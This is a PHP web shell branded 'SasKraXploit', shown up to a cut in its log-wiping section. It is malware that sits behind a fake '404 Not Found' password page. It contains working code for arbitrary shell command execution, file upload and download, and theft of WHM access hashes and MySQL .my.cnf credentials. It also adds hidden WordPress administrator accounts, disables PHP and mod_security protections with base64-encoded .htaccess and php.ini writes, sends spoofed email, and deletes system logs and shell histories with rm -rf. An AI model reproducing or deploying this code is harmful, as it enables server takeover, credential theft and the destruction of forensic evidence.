<?php
session_start();
error_reporting(0);
set_time_limit(0);
date_default_timezone_set("Asia/Jakarta");
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$xxx = "5a85ad7da345197cd97874331b6f0967";///SasKraXploit
if(get_magic_quotes_gpc()) {  
function VEstripslashes($array) {     
return is_array($array) ? array_map('VEstripslashes', $array) : stripslashes($array);   }   
$_POST = VEstripslashes($_POST); 
$_COOKIE = VEstripslashes($_COOKIE); } 
function Login() {
  die(" <title> 404 Not Found </title>

<html>
  <head>
  <style> input { margin:0;background-color:#000000;border:1px solid #fff; } </style>
  </head>
        <title>
        404 Not Found
        </title>
        <body>
  <center><img src='https://d.top4top.io/p_1748iokq91.png' height='210' widht='160' title='Hahaha'><br></center><br><br><br>
   </head>
   <body>
    <style>
      body {
    background:black;
}
  <center>input[type=password] {
  width: 150px;
  height: 15px;
  color: red;
  background: transparent;
  border: 1px dotted green;
  margin-left: 20px;
  text-align: center; </center>
}
    </style>
      <center>
    <form method=post> 
     <input type=password name='xxx'>
      </from>
      </center>
");
}

function VEsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

if(!empty($xxx)) {
    if(isset($_POST['xxx']) && (md5($_POST['xxx']) == $xxx))
        VEsetcookie(md5($_SERVER['HTTP_HOST']), $xxx);

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $xxx))
        Login();
        if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
}
echo"
<title>$ SasKraXploit $</title>
  <meta name='theme-color'content='#414141'>
   </head>
<link href='https://fonts.googleapis.com/css?family=Quicksand' rel='stylesheet' type='text/css'>";
echo"<center><font color='white'face='Quicksand'size='4'>";
echo"
<style>
@import url('https://fonts.googleapis.com/css?family=Abel|Didact+Gothic|Dosis|Monda|PT+Sans+Caption|Shadows+Into+Light|New+Rocker');    
  input[type=submit] {
       background:transparent;
       color:white;
       border: 1px solid white; 
       padding:5px 5px 5px 5px;
       }
        input[type=file] {
       background:transparent; 
       padding:5px 6px 6px 6px;
       }
       a {
color:#fff;
}
a:hover {
color:green;
}
table, th, td {
  border-collapse:collapse;
  background: black;
  font-family: 'Monda';
  font-size: 14px;
  color:#FFFFFF;
}
.table_home, .th_home, .td_home {
  border: 2px solid #00ab9a;
}
li{
  padding:1px; 
  background: linear-gradient(-45deg, #30db00, #A100C9, #8D8F8F, #FF009B);
  background-size: 400% 400%;
  -webkit-animation: Gradient 1s ease infinite;
  -moz-animation: Gradient 1s ease infinite;
  animation: Gradient 1s ease infinite;
  position: relative;
  border-radius:15px;
 position: relative;
   }
   li:hover{
  padding:1px; 
  background: linear-gradient(-45deg, #30db00, #A100C9, #8D8F8F, #FF009B);
  background-size: 400% 400%;
  -webkit-animation: Gradient 1s ease infinite;
  -moz-animation: Gradient 1s ease infinite;
  animation: Gradient 1s ease infinite;
  position: relative;
  border-radius:15px;
 position: relative;
   }
.result {
padding: 15px;
width: 500px;
margin: 0 auto;
border-radius: 10px;
-moz-border-radius: 10px;
-webkit-border-radius: 10px;
--borderWidth: 10px;
  position: relative;
  border-radius: var(--borderWidth);
  }
.result:after {
  content: '';
  position: absolute;
  top: calc(-1 * var(--borderWidth));
  left: calc(-1 * var(--borderWidth));
  height: calc(100% + var(--borderWidth) * 2);
  width: calc(100% + var(--borderWidth) * 2);
  background: linear-gradient(60deg, #FF00D4, #1098ad, #EEFF00, #FF00CA,#FF00EE,#f37055 , #07b39b, #6fba82);
  border-radius: calc(2 * var(--borderWidth));
  z-index: -1;
  animation: animatedgradient 1s ease alternate infinite;
  background-size: 500% 400%;
}
@keyframes animatedgradient {
  0% {
    background-position: 0% 50%;
  }
  50% {
    background-position: 100% 50%;
  }
  100% {
    background-position: 0% 50%;
  }
}
textarea {
  margin:auto;
  border:2px solid #2EFF00;
  width:100%;
  text-align:left;
  height:400px;
  background:transparent;
  color:#FAFAFA;
  padding:0 2px;
  font-size:13px;
}
input[type=submit]:hover{ 
  border-bottom:1px solid #FF6100;
  font-size:13px; 
  border-top:1px solid #FF6100; 
}
body {
  width: 100wh;
  background:black;
  }
a{
  text-decoration:none;
  }
li {
  display: inline;
  margin: 1px;
  padding: 1px;
}
ul {
  display: inline;
  margin: 1px;
  padding: 1px;
}
#menu a{
  padding:4px 19px;
  margin:0;
  background:transparent;
  text-decoration:none;
  letter-spacing:2px;
  font-family:Dosis'

}
#menu a:hover{
  background:transparent;
  color:red;
  border-bottom:2px solid black;
  border-top:2px solid black;
}
input[type=text], option, select { 
  padding:1px; 
  background: linear-gradient(-45deg, #FF00CF, #A100C9, #8D8F8F, #FF009B);
  background-size: 400% 400%;
  -webkit-animation: Gradient 1s ease infinite;
  -moz-animation: Gradient 1s ease infinite;
  animation: Gradient 1s ease infinite;
}

@-webkit-keyframes Gradient {
  0% {
    background-position: 0% 50%
  }
  50% {
    background-position: 100% 50%
  }
  100% {
    background-position: 0% 50%
  }
}

@-moz-keyframes Gradient {
  0% {
    background-position: 0% 50%
  }
  50% {
    background-position: 100% 50%
  }
  100% {
    background-position: 0% 50%
  }
}

@keyframes Gradient {
  0% {
    background-position: 0% 50%
  }
  50% {
    background-position: 100% 50%
  }
  100% {
    background-position: 0% 50%
  }
}
ul{
  padding:1px; 
  background: linear-gradient(-45deg, #FF00CF, #A100C9, #8D8F8F, #FF009B);
  background-size: 400% 400%;
  -webkit-animation: Gradient 1s ease infinite;
  -moz-animation: Gradient 1s ease infinite;
  animation: Gradient 1s ease infinite;
  position: relative;
  border-radius:15px;
}
ul:hover{
  padding:1px; 
  background: linear-gradient(-45deg, #FF00CF, #A100C9, #8D8F8F, #FF009B);
  background-size: 400% 400%;
  -webkit-animation: Gradient 1s ease infinite;
  -moz-animation: Gradient 1s ease infinite;
  animation: Gradient 1s ease infinite;
  position: relative;
  border-radius:15px;
} 
}
</style><br><br>";
function w($dir,$perm) {
    if(!is_writable($dir)) {
        return "<font color=red>".$perm."</font>";
    } else {
        return "<font color=#00C9FF>".$perm."</font>";
    }
}
function r($dir,$perm) {
    if(!is_readable($dir)) {
        return "<font color=red>".$perm."</font>";
    } else {
        return "<font color=#FF00BA>".$perm."</font>";
    }
}
function exe($cmd) {
    if(function_exists('system')) {        
        @ob_start();       
        @system($cmd);     
        $buff = @ob_get_contents();        
        @ob_end_clean();       
        return $buff;  
    } elseif(function_exists('exec')) {        
        @exec($cmd,$results);      
        $buff = "";        
        foreach($results as $result) {         
            $buff .= $result;      
        } return $buff;    
    } elseif(function_exists('passthru')) {        
        @ob_start();       
        @passthru($cmd);       
        $buff = @ob_get_contents();        
        @ob_end_clean();       
        return $buff;  
    } elseif(function_exists('shell_exec')) {      
        $buff = @shell_exec($cmd);     
        return $buff;  
    }
}
function perms($file){
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
    } else {
    // Unknown
    $info = 'u';
    }
        // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
    (($perms & 0x0800) ? 's' : 'x' ) :
    (($perms & 0x0800) ? 'S' : '-'));
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
    (($perms & 0x0400) ? 's' : 'x' ) :
    (($perms & 0x0400) ? 'S' : '-'));
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
    (($perms & 0x0200) ? 't' : 'x' ) :
    (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
function hdd($s) {
    if($s >= 1073741824)
    return sprintf('%1.2f',$s / 1073741824 ).' GB';
    elseif($s >= 1048576)
    return sprintf('%1.2f',$s / 1048576 ) .' MB';
    elseif($s >= 1024)
    return sprintf('%1.2f',$s / 1024 ) .' KB';
    else
    return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function getsource($url) {
    $curl = curl_init($url);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    $content = curl_exec($curl);
            curl_close($curl);
    return $content;
}
function bing($dork) {
    $npage = 1;
    $npages = 30000;
    $allLinks = array();
    $lll = array();
    while($npage <= $npages) {
        $x = getsource("http://www.bing.com/search?q=".$dork."&first=".$npage);
        if($x) {
            preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
            foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
            $npage = $npage + 10;
            if (preg_match("(first=" . $npage . "&)siU", $x, $linksuiv) == 0) break;
        } else break;
    }
    $URLs = array();
    foreach($allLinks as $url){
        $exp = explode("/", $url);
        $URLs[] = $exp[2];
    }
    $array = array_filter($URLs);
    $array = array_unique($array);
    $sss = count(array_unique($array));
    foreach($array as $domain) {
        echo $domain."\n";
    }
}
function reverse($url) {
    $ch = curl_init("http://domains.yougetsignal.com/domains.php");
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
          curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_POST, 1);
    $resp = curl_exec($ch);
    $resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
    $array = explode(",,", $resp);
    unset($array[0]);
    foreach($array as $lnk) {
        $lnk = "http://$lnk";
        $lnk = str_replace(",", "", $lnk);
        echo $lnk."\n";
        ob_flush();
        flush();
    }
        curl_close($ch);
}
if(get_magic_quotes_gpc()) {
    function idx_ss($array) {
        return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
    }
    $_POST = idx_ss($_POST);
    $_COOKIE = idx_ss($_COOKIE);
}
if(isset($_GET['dir'])) {
    $dir = $_GET['dir'];
    chdir($dir);
} else {
    $dir = getcwd();
}
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=red>OFF</font>";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
if(!function_exists('posix_getegid')) {
    $user = @get_current_user();
    $uid = @getmyuid();
    $gid = @getmygid();
    $group = "?";
} else {
    $uid = @posix_getpwuid(posix_geteuid());
    $gid = @posix_getgrgid(posix_getegid());
    $user = $uid['name'];
    $uid = $uid['uid'];
    $group = $gid['name'];
    $gid = $gid['gid'];
}
echo"<center><img src='https://d.top4top.io/p_1748iokq91.png'width='200'height='200'><br>";
echo"<font size='3'>";
foreach($scdir as $c_dir => $cdir) {  
  echo "<a href='?dir=";
  for($i = 0; $i <= $c_dir; $i++) {
    echo $scdir[$i];
    if($i != $c_dir) {
    echo "/";
    }
  }
  echo "'>$cdir</a>/";
}
echo '<pre><center><div id="menu">';
echo "<ul><a style='color: white;' href='?dir=$dir&saf=info'>INFO WEB</a></ul><br><br>";
echo"<li> <a href='?dir=$dir&saf=maill'>MAILL</a></li>";
echo"<ul> <a href='?dir=$dir&saf=log'>NGELOG (WP)</a></ul>";
echo"<ul> <a href='?dir=$dir&saf=uplo'>Edit .htaccess</a></ul>";
echo"<li><a href='?dir=$dir&saf=bck'>BACKUP</a> </li><br><br>";
echo"<li> <a href='?dir=$dir&saf=mass'>MASS</a> </li>";
echo"<ul> <a href='?dir=$dir&delete=logs'>LOGS  </a> </ul>";
echo "<ul><a href='?dir=$dir&saf=about'>ABOUT</a> </ul>";
echo "<ul><a href='?dir=$dir&do=jumping'>JUMPING</a> </ul>";
echo"<ul> <a href='?dir=$dir&config=grabber'>CONFIG </a></ul>";
echo"<ul> <a href='?dir=$dir&sym=brudul'>SYMLINK</a></ul>";
echo"<ul> <a href='?dir=$dir&saf=file'>FILES </a> </ul>";
echo "<li> <a href='?dir=$dir&bypass=disableasu'>DISABLE</a></li><br><br>";
echo "<li> <a href='?dir=$dir&upload3=upload'>UPLOAD</a> </li>";
echo "<ul><a href='?dir=$dir&saf=cpanel'>CPANEL</a> </ul>";
echo"<ul> <a href='?dir=$dir&saf=adminwp'>ADMINWP</a> </ul>";
echo "<ul><a href='?dir=$dir&asu=whm'>WHMGRAB</a></ul>";
echo"<ul><a href='?dir=$dir&saf=cpanelgb'>CPANELX</a> </ul>";
echo "<li><a href='?dir=$dir&saf=adminer'>ADMIN</a> </li>";
echo "<ul> <a href='?dir=$dir&saf=406'>NGELOG (NO WP)</a></ul>";
echo"</li><br><br>";
echo"<ul> <a href='?dir=$dir&saf=userx'>USERWP</a> </ul>";
echo "<li> <a href='?dir=$dir&saf=smtp'>SMTP</a> </li>";
echo"</ul><br><br></pre>";
echo"</div><br>";
  if($_POST['do_cmd']) {
    echo "<pre>".exe($_POST['cmd'])."</pre>";
    } elseif($_GET['upload3'] == 'upload') {
    echo "<center>";
    if($_POST['upload']) {
        if($_POST['tipe_upload'] == 'biasa') {
            if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
                $act = "<font color=blue>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
            } else {
                $act = "<font color=red>failed to upload file</font>";
            }
        } else {
            $root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
            $web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
            if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
                if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
                    $act = "<font color=blue>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
                } else {
                    $act = "<font color=red>failed to upload file</font>";
                }
            } else {
                $act = "<font color=red>failed to upload file</font>";
            }
        }
    }
    echo "Upload File:
    <form method='post' enctype='multipart/form-data'>
    <input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($dir,"Writeable")." ]
    <input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
    <input type='file' name='ix_file'>
    <input type='submit' value='upload' name='upload'>
    </form>";
    echo $act;
    if(isset($_POST['rtdown']))
{
$url = $_POST['rtdown'];
$newfname = $down. basename($url);
$file = fopen ($url, "rb");
if ($file) {
  $newf = fopen ($newfname, "wb");
  if ($newf)
  while(!feof($file)) {
    fwrite($newf, fread($file, 1024 * 8 ), 1024 * 8 );
  }
  }

if ($file) {
  fclose($file);
}
if ($newf) {
  fclose($newf);
}
}
    echo "<td colspan='2'><form method='post' ><span></span><br><input class='foottable' type=text name=rtdown value=''><input type=submit value='>>'></form></td>
        </tr>
       <tr>";
    echo "</center>";
    } elseif($_GET['asu'] == 'whm') {
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    return trim($ar1[0]);
}


echo "<center>";
$d0mains = @file('/etc/named.conf');
$domains = scandir("/var/named");

if ($domains or $d0mains)
{
    $domains = scandir("/var/named");
    if($domains) {
echo "<table align='center'><tr><th> COUNT </th><th> USER </th><th> | </th><th> Access Hash </th><th> .MY.CNF </th></tr>";
$count=1;
$dc = 0;
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dirz = '/home/'.$owner['name'].'/.accesshash';
$dirz1 = '/home/'.$owner['name'].'/.my.cnf';
$path = getcwd();

if (is_readable($dirz) && (dirz1)) {
copy($dirz, ''.$path.'/'.$owner['name'].'.txt');
$p=file_get_contents(''.$path.'/'.$owner['name'].'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td>".$count++."</td><td>".$owner['name']."</td><td>".$password."</td><td><a href='".$owner['name'].".txt' target='_blank'>Click Here</a></td></tr>";
$dc++;
}

}
}
echo '</table>'; 
$total = $dc;
echo '<br><div class="result">Total WHM Found = '.$total.'</h3><br />';
echo '</center>';
}else{
echo "No WHM";}
}else{
echo"<center><h2>GAK BISA AMBIL WHM</h2>";
echo "<div class='result'><i><font color='#FF0000'>ERROR</font><br><font color='#FF0000'>/var/named</font> or <font color='#FF0000'>etc/named.conf</font> Not Accessible!</i></div>";
}
} elseif($_GET['saf'] == 'bck') {
function rmdir_recursive($dir) {
    foreach(scandir($dir) as $file) {
       if('.' === $file || '..' === $file) continue;
       if(is_dir("$dir/$file")) rmdir_recursive("$dir/$file");
       else unlink("$dir/$file");
   }
   rmdir($dir);
}
if($_FILES["zip_file"]["name"]) {
  $filename = $_FILES["zip_file"]["name"];
  $source = $_FILES["zip_file"]["tmp_name"];
  $type = $_FILES["zip_file"]["type"];
  $name = explode(".", $filename);
  $accepted_types = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
  foreach($accepted_types as $mime_type) {
    if($mime_type == $type) {
      $okay = true;
      break;
    } 
  }
  $continue = strtolower($name[1]) == 'zip' ? true : false;
  if(!$continue) {
    $message = "Salah tolo";
  }
  $path = dirname(__FILE__).'/';
  $filenoext = basename ($filename, '.zip'); 
  $filenoext = basename ($filenoext, '.ZIP');
  $targetdir = $path . $filenoext;
  $targetzip = $path . $filename; 
  if (is_dir($targetdir))  rmdir_recursive ( $targetdir);
  mkdir($targetdir, 0777);
  if(move_uploaded_file($source, $targetzip)) {
    $zip = new ZipArchive();
    $x = $zip->open($targetzip); 
    if ($x === true) {
      $zip->extractTo($targetdir);
      $zip->close();
 
      unlink($targetzip);
    }
    $message = "<b>Sukses</b>";
  } else {  
    $message = "<b>Error</b>";
  }
} 
echo "<center><td><h2>Backup All Files</h2><form action='' method='post'><font style='text-decoration: underline;'>Folder:</font><br><input type='text' name='dir' value='$dir' style='width: 450px;' height='10'><br><font style='text-decoration: underline;'>Save To:</font><br><input type='text' name='save' value='$dir/backup.zip' style='width: 450px;' height='10'><br><input type='submit' name='backup' value='BackUp!' style='width: 215px;'></form></center>"; 
  if($_POST['backup']){ 
  $save=$_POST['save'];
  function Zip($source, $destination)
{
    if (extension_loaded('zip') === true)
    {
        if (file_exists($source) === true)
        {
            $zip = new ZipArchive();

            if ($zip->open($destination, ZIPARCHIVE::CREATE) === true)
            {
                $source = realpath($source);

                if (is_dir($source) === true)
                {
                    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);

                    foreach ($files as $file)
                    {
                        $file = realpath($file);

                        if (is_dir($file) === true)
                        {
                            $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
                        }

                        else if (is_file($file) === true)
                        {
                            $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
                        }
                    }
                }

                else if (is_file($source) === true)
                {
                    $zip->addFromString(basename($source), file_get_contents($source));
                }
            }

            return $zip->close();
        }
    }

    return false;
}
  Zip($_POST['dir'],$save);
  echo "<center>Done , Save To <b>$save</b></center>";
  }
   } elseif($_GET['saf'] == 'maill') {
      echo"<li> <a href='?dir=$dir&saf=exmail'>MAIL DUMP ON TEXT </a></li>";
echo"
<html>
<h1>Email Test</h1>
</html>
 
<table border=2>
<form action=''method=post>
<tr><td>To Email: </td><td><input type=text name=email size=30></td></tr>
<tr><td>Sender Name: </td><td><input type=text name=name size=30></td></tr>
<tr><td>Sender Email: </td><td><input type=text name=sender size=30></td></tr>
<tr><td>Subject: </td><td><input type=text name=subject size=30></td></tr>
<tr><td>Content: </td><td><textarea rows=10 cols=30 name=content></textarea></td></tr>
<tr><td><input type=submit value='Send Mail'></td></tr>
</form>
</table>";
$email = $_POST['email'];
$content = $_POST['content'];
$name = $_POST['name'];
$sender = $_POST['sender'];
 
$subject = $_POST['subject'];
 
$headers = "From: $name "."<".$sender.">\r\n";
mail($email, $subject, $content, $headers );

} elseif($_GET['saf'] == 'exmail') {
?>
  <center> <br>
  Mail Extrator from Text <br>
  coded by <font color="red"><a href="https://twitter.com/3M4i1">Kyfx</font>
  </a>
  <a href="http://pastebin.com/u/Kyfx">
  My Pastebin Account Click Here</a> <br><br>
      <form  method="post">
     <textarea name="magnom" cols="111" rows="15"></textarea> <br>
     <input type="submit" name="mr" value="Extrat Emails only"/>
      </form>
<br>
  </center>
</body>
</html>
<?php
  if($_POST['mr']){
 $text=$_POST['magnom'];
 preg_match_all('#[A-Z0-9a-z._%+-]+@[A-Za-z0-9.+-]+#',$text,$matches);
foreach ($matches[0] as $ul){
  echo $ul."<br>";
}         }
} elseif($_GET['saf'] == 'y') {
  
} elseif($_GET['saf'] == 'adminwp') {
echo";wordpress add admin
work di gunakan di public_html
<table border=2>
<form action=''method=post>
<tr><td>Username: </td><td><input type=text name=user size=30></td></tr>
<tr><td>Password: </td><td><input type=text name=pass size=30></td></tr>
<tr><td>Email: </td><td><input type=text name=email size=30></td></tr>
<tr><td><input type=submit value='Coba'></td></tr>
</form>
</table>";
// Admin User Auto Add Coded By Mauritania Attacker recoded by Toku Haxor

require_once('wp-blog-header.php');
require_once('wp-includes/registration.php');

$newusername = $_POST['user'];
$newpassword = $_POST['pass'];
$newemail = $_POST['email'];


if ( $newpassword != 'YOURPASSWORD' && $newemail != 'YOUREMAIL@TEST.com' && $newusername !='YOURUSERNAME'  ) 
{
  // Check that the user doesn't exist already
  if ( !username_exists($newusername) && !email_exists($newemail) ) 
  {
    // Create the admin user and set the role to Administrator
    $user_id = wp_create_user( $newusername, $newpassword, $newemail);
    if ( is_int($user_id) )
    {
      $wp_user_object = new WP_User($user_id);
      $wp_user_object->set_role('administrator');
      echo 'bisa gan';
    } 
    else {
      echo 'gagal';
    }
  } 
  else {
    echo 'email sudah di gunakan';
  }
} 
else {
  echo "kntl";
}
    } elseif($_GET['saf'] == 'adminer') {
  $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
  function adminer($url, $isi) {
    $fp = fopen($isi, "w");
    $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
          curl_setopt($ch, CURLOPT_FILE, $fp);
    return curl_exec($ch);
          curl_close($ch);
    fclose($fp);
    ob_flush();
    flush();
  }
  if(file_exists('adminer.php')) {
    echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
  } else {
    if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
      echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
    } else {
      echo "<center><font color=red>gagal buat file adminer</font></center>";
    }
  }
  } elseif($_GET['bypass'] == 'disableasu'){
    echo "<br><br><center>";
    echo "<form method=post><input type=submit name=ini value='php.ini' />&nbsp;<input type=submit name=htce value='.htaccess' />&nbsp;<input type=submit name=litini value='Litespeed' /></form>";
    if(isset($_POST['ini']))
{
    $file = fopen("php.ini","w");
    echo fwrite($file,"disable_functions=none
safe_mode = Off
  ");
    fclose($file);
    echo "<a href='php.ini'>click here!</a>";
}   if(isset($_POST['htce']))
{
    $file = fopen(".htaccess","w");
    echo fwrite($file,"<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>
  ");
    fclose($file);
    echo "htaccess successfully created!";
}               if(isset($_POST['litini'])){
    $iniph = '<? n echo ini_get("safe_mode"); n echo ini_get("open_basedir"); n include($_GET["file"]); n ini_restore("safe_mode"); n ini_restore("open_basedir"); n echo ini_get("safe_mode"); n echo ini_get("open_basedir"); n include($_GET["ss"]; n ?>';
       $byph = "safe_mode = Off n disable_functions= ";
    $comp="PEZpbGVzICoucGhwPg0KRm9yY2VUeXBlIGFwcGxpY2F0aW9uL3gtaHR0cGQtcGhwNA0KPC9GaWxlcz4=";
    file_put_contents("php.ini",base64_decode($byph));
    file_put_contents("ini.php",base64_decode($iniph));
    file_put_contents(".htaccess",base64_decode($comp));
    echo "<script>alert('Disable Functions in Litespeed Created'); hideAll();</script>";
    echo"</center>";
}
  } elseif($_GET['delete'] == 'logs') {
    echo '<br><center><b><span>Delete Logs ( For Safe )</span></b><center><br>';
  echo "<table style='margin: 0 auto;'><tr valign='top'><td align='left'>";      
  exec("rm -rf /tmp/logs");
  exec("rm -rf /root/.ksh_history");
  exec("rm -rf /root/.bash_history");
  exec("rm -rf /root/.bash_logout");
  exec("rm -rf /usr/local/apache/logs");
  exec("rm -rf /usr/local/apache/log");
  exec("rm -rf /var/apache/logs");
  exec("rm -rf /var/apache/log");
  exec("rm -rf /var/run/utmp");
  exec("rm -rf /var/logs");
  exec("rm -rf /var/log");
  exec("rm -rf /var/adm");
  exec("rm -rf /etc/wtmp");
  exec("rm -rf /etc/utmp");
  exec("rm -rf $HISTFILE");
  exec("rm -rf /var/log/lastlog");
  exec("rm -rf /var/log/wtmp");

  shell_exec("rm -rf /tmp/logs");
  shell_exec("rm -rf /root/.ksh_history");
  shell_exec("rm -rf /root/.bash_history");
  shell_exec("rm -rf /root/.bash_logout");
  shell_exec("rm -rf /usr/local/apache/logs");
  shell_exec("rm -rf /usr/local/apache/log");
  shell_exec("rm -rf /var/apache/logs");
  shell_exec("rm -rf /var/apache/log");
  shell_exec("rm -rf /var/run/utmp");
  shell_exec("rm -rf /var/logs");
  shell_exec("rm -rf /var/log");
  shell_exec("rm -rf /var/adm");
  shell_exec("rm -rf /etc/wtmp");
  shell_exec("rm -rf /etc/utmp");
  shell_exec("rm -rf $HISTFILE");
  shell_exec("rm -rf /var/log/lastlog");
  shell_exec("rm -rf /var/log/wtmp");

  passthru("rm -rf /tmp/logs");
  passthru("rm -rf /root/.ksh_history");
  passthru("rm -rf /root/.bash_history");
  passthru("rm -rf /root/.bash_logout");
  passthru("rm -rf /usr/local/apache/logs");
  passthru("rm -rf /usr/local/apache/log");
  passthru("rm -rf /var/apache/logs");
  passthru("rm -rf /var/apache/log");
  passthru("rm -rf /var/run/utmp");
  passthru("rm -rf /var/logs");
  passthru("rm -rf /var/log");
  passthru("rm -rf /var/adm");
  passthru("rm -rf /etc/wtmp");
  passthru("rm -rf /etc/utmp");
  passthru("rm -rf $HISTFILE");
  passthru("rm -rf /var/log/lastlog");
  passthru("rm -rf /var/log/wtmp");


  system("rm -rf /tmp/logs");
  sleep(2);
  echo'<br>Deleting .../tmp/logs ';
  sleep(2);

  system("rm -rf /root/.bash_history");
  sleep(2);
  echo'<p>Deleting .../root/.bash_history </p>';

  system("rm -rf /root/.ksh_history");
  sleep(2);
  echo'<p>Deleting .../root/.ksh_history </p>';

  system("rm -rf /root/.bash_logout");
  sleep(2);
  echo'<p>Deleting .../root/.bash_logout </p>';

  system("rm -rf /usr/local/apache/logs");
  sleep(2);
  echo'<p>Deleting .../usr/local/apache/logs </p>';

  system("rm -rf /usr/local/apache/log");
  sleep(2);
  echo'<p>Deleting .../usr/local/apache/log </p>';

  system("rm -rf /var/apache/logs");
  sleep(2);
  echo'<p>Deleting .../var/apache/logs </p>';

  system("rm -rf /var/apache/log");
  sleep(2);
  echo'<p>Deleting .../var/apache/log </p>';

  system("rm -rf /var/run/utmp");
  sleep(2);
  echo'<p>Deleting .../var/run/utmp </p>';

  system("rm -rf /var/logs");
  sleep(2);
  echo'<p>Deleting .../var/logs </p>';

  system("rm -rf /var/log");
  sleep(2);
  echo'<p>Deleting .../var/log </p>';

